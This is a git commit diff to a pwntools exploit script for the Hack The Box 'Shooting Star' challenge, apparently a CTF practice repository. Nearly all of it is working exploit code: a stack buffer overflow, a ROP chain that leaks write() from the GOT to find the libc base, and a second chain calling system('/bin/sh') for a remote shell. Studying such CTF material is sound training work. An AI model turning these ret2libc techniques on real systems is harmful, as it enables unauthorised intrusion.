51743aad99a1791a5c052561f064f58009035873
badorius <salvadormuntane@gmail.com>
2022-12-19 11:46:44 +0100

    Crypto Shooting star

--- hackthebox/ShootingStar/Files/pwn_star.py
+++ hackthebox/ShootingStar/Files/pwn_star.py
@@ -1,65 +1,112 @@
-#!/usr/bin/python
-
 from pwn import *
 
-context.binary = 'shooting_star'
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
 
 
-def get_process():
-    if len(sys.argv) == 1:
-        return context.binary.process()
-
-    host, port = sys.argv[1].split(':')
-    return remote(host, int(port))
-
-
-pop_rdi_ret         = 0x4012cb
-pop_rsi_pop_r15_ret = 0x4012c9
-
-write_plt = 0x401030
-main_addr = 0x401230
-
-offset = 72
-junk = b'A' * offset
+def find_ip(payload):
+    # Launch process and send payload
+    p = process(exe)
+    p.sendlineafter('>', '1')
+    p.sendlineafter('>>', payload)
+    # Wait for the process to crash
+    p.wait()
+    # Print out the address of EIP/RIP at the time of crashing
+    # ip_offset = cyclic_find(p.corefile.pc)  # x86
+    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
 
 
-def leak(p, function_got: int) -> int:
-    payload  = junk
-    payload += p64(pop_rdi_ret)
-    payload += p64(1)
-    payload += p64(pop_rsi_pop_r15_ret)
-    payload += p64(function_got)
-    payload += p64(0)
-    payload += p64(write_plt)
-    payload += p64(main_addr)
-
-    p.sendlineafter(b'> ', b'1')
-    p.sendlineafter(b'>> ', payload)
-    p.recvline()
-    p.recvline()
-
-    return u64(p.recv(8))
+# Specify your GDB script here for debugging
+gdbscript = '''
+init-pwndbg
+break main
+'''.format(**locals())
 
 
-def main():
-    p = get_process()
+# Set up pwntools for the correct architecture
+exe = './shooting_star'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Enable verbose logging so we can see exactly what is being sent (info/debug)
+context.log_level = 'debug'
 
-    write_got   = 0x404018
-    read_got    = 0x404020
-    setvbuf_got = 0x404028
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
 
-    write_addr   = leak(p, write_got)
-    read_addr    = leak(p, read_got)
-    setvbuf_addr = leak(p, setvbuf_got)
+# Pass in pattern_size, get back EIP/RIP offset
+offset = find_ip(cyclic(100))
 
-    log.info(f'Leaked write() address:   {hex(write_addr)}')
-    log.info(f'Leaked read() address:    {hex(read_addr)}')
-    log.info(f'Leaked setvbuf() address: {hex(setvbuf_addr)}')  
+# Start program
+io = start()
 
-    p.interactive()
+# Need pop RDI gadget to pass 'sh' to system():
+# ropper - f shooting_star - -search "pop rdi"
+pop_rdi = 0x4012cb
+# Need pop RSI to put got.write address in (before leaking via plt.write)
+pop_rsi_r15 = 0x4012c9  # pop rsi; pop r15; ret;
+info("%#x pop_rdi", pop_rdi)
+info("%#x pop_rsi_r15", pop_rsi_r15)
 
+# Build the payload
+payload = flat(
+    {offset: [
+        pop_rsi_r15,  # Pop the following value from stack into RSI
+        elf.got.write,  # Address of write() in GOT
+        0x0,  # Don't need anything in r15
+        elf.plt.write,  # Call plt.write() to print address of got.write()
+        elf.symbols.main  # Return to beginning of star function
+    ]}
+)
 
-if __name__ == '__main__':
-    main()
+# Send the payload
+io.sendlineafter('>', '1')
+io.sendlineafter('>>', payload)
+io.recvuntil('May your wish come true!\n')
 
+# Get our leaked got.write address and format it
+leaked_addr = io.recv()
+got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
+info("leaked got_write: %#x", got_write)
 
+# We can get libc base address by subtracting offset of write
+# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep write
+libc_base = got_write - 0xeef20
+info("libc_base: %#x", libc_base)
+
+# Now we can calculate system location:
+# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+# Could have also got offset in GDB-pwndbg with 'print &system - &write'
+system_addr = libc_base + 0x48e50
+info("system_addr: %#x", system_addr)
+
+# We also need /bin/sh offset, can get in GDB using 'search -s "/bin/sh"'
+# Can also get with 'strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"'
+bin_sh = libc_base + 0x18a156
+info("bin_sh: %#x", bin_sh)
+
+# Now let's build our actual payload, using the system() address
+payload = flat(
+    {offset: [
+        pop_rdi,  # Pop the following value from stack into RDI
+        bin_sh,  # Pop me plz xD
+        system_addr  # Now call system('sh')
+    ]}
+)
+
+# Send the payload
+io.sendline('1')
+io.sendlineafter('>>', payload)
+io.recvuntil('May your wish come true!\n')
+
+# Got Shell?
+io.interactive()
